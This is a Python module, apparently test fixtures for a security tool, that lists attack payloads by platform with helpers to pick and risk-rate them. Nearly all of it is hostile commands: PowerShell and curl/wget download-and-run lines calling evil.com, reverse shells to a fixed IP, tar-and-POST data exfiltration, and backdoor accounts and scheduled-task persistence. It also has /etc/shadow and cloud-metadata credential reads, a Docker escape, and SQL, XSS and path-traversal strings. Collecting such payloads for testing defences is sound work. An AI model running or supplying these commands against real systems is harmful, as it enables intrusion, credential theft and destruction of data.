"""
Sample Payloads for Testing
Contains: Windows, Linux, Web attack vectors
Purpose: Realistic payload testing scenarios
"""

# Windows Payloads
windows_payloads = [
    # Basic reconnaissance
    "whoami",
    "hostname",
    "netstat -an",
    "ipconfig /all",
    "systeminfo",
    
    # PowerShell payloads
    "powershell -c \"Get-Process\"",
    "powershell IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')",
    "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
    
    # Command injection
    "cmd /c dir C:\\",
    "cmd /c type C:\\Windows\\System32\\drivers\\etc\\hosts",
    
    # Registry manipulation
    "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    
    # File operations
    "copy C:\\important.txt \\\\attacker\\share\\",
    "del /f /q C:\\logs\\security.log"
]

# Linux Payloads
linux_payloads = [
    # Basic reconnaissance
    "whoami && id",
    "uname -a",
    "ps aux",
    "netstat -tulpn",
    "cat /etc/passwd",
    
    # Remote shells
    "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1",
    "nc -e /bin/bash 192.168.1.100 4444",
    "wget -O- http://evil.com/shell.sh | bash",
    "curl http://evil.com/payload | bash",
    
    # Privilege escalation
    "sudo -l",
    "find / -perm -4000 2>/dev/null",
    "cat /etc/shadow",
    
    # Persistence
    "echo '* * * * * /tmp/backdoor' | crontab -",
    "echo 'evil_user:$6$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd",
    
    # Data exfiltration
    "tar czf - /home/user/documents | base64 | curl -X POST -d @- http://evil.com/data",
    "find /home -name '*.pdf' -exec cp {} /tmp/exfil/ \\;"
]

# Web Application Payloads
web_payloads = [
    # XSS payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    
    # SQL Injection
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT username,password FROM users --",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    
    # Command Injection
    "; cat /etc/passwd",
    "| whoami",
    "&& ls -la",
    "`id`",
    
    # Path Traversal
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd",
    
    # Template Injection
    "{{7*7}}",
    "${7*7}",
    "<%=7*7%>",
    "#{7*7}"
]

# Container/Cloud Payloads
container_payloads = [
    # Docker escape
    "docker run -v /:/host -it ubuntu chroot /host bash",
    "mount -t proc proc /proc && cat /proc/1/cgroup",
    
    # Kubernetes
    "kubectl get pods --all-namespaces",
    "curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods",
    
    # AWS metadata
    "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws s3 ls s3://sensitive-bucket",
    
    # Environment disclosure
    "env | grep -i secret",
    "cat /proc/self/environ"
]

# Advanced Persistent Threat (APT) Style Payloads
apt_payloads = [
    # Living off the land
    "certutil -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
    "bitsadmin /transfer myDownloadJob /download /priority normal http://evil.com/shell.exe C:\\temp\\shell.exe",
    "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll",
    
    # WMI abuse
    "wmic process call create \"powershell -enc <base64_payload>\"",
    "wmic /node:target /user:admin /password:pass process call create \"cmd /c whoami\"",
    
    # Scheduled tasks
    "schtasks /create /tn \"SystemUpdate\" /tr \"C:\\temp\\backdoor.exe\" /sc daily /st 09:00",
    
    # Service manipulation
    "sc create evilservice binpath= \"C:\\temp\\backdoor.exe\" start= auto",
    "net user backdoor P@ssw0rd /add && net localgroup administrators backdoor /add"
]

# Payload categories for testing
payload_categories = {
    'windows': windows_payloads,
    'linux': linux_payloads,
    'web': web_payloads,
    'container': container_payloads,
    'apt': apt_payloads
}

def get_payloads_by_category(category):
    """Get payloads by category"""
    return payload_categories.get(category, [])

def get_random_payload(category=None):
    """Get random payload from category or all"""
    import random
    
    if category and category in payload_categories:
        return random.choice(payload_categories[category])
    else:
        all_payloads = []
        for payloads in payload_categories.values():
            all_payloads.extend(payloads)
        return random.choice(all_payloads)

def get_payload_info(payload):
    """Get information about a payload"""
    info = {
        'payload': payload,
        'length': len(payload),
        'category': 'unknown',
        'risk_level': 'medium',
        'description': 'Generic payload'
    }
    
    # Categorize payload
    for category, payloads in payload_categories.items():
        if payload in payloads:
            info['category'] = category
            break
    
    # Assess risk level
    high_risk_indicators = ['rm -rf', 'DROP TABLE', 'passwd', 'shadow', '/etc/', 'admin']
    medium_risk_indicators = ['whoami', 'netstat', 'ps aux', 'alert(']
    
    payload_lower = payload.lower()
    if any(indicator in payload_lower for indicator in high_risk_indicators):
        info['risk_level'] = 'high'
    elif any(indicator in payload_lower for indicator in medium_risk_indicators):
        info['risk_level'] = 'medium'
    else:
        info['risk_level'] = 'low'
    
    return info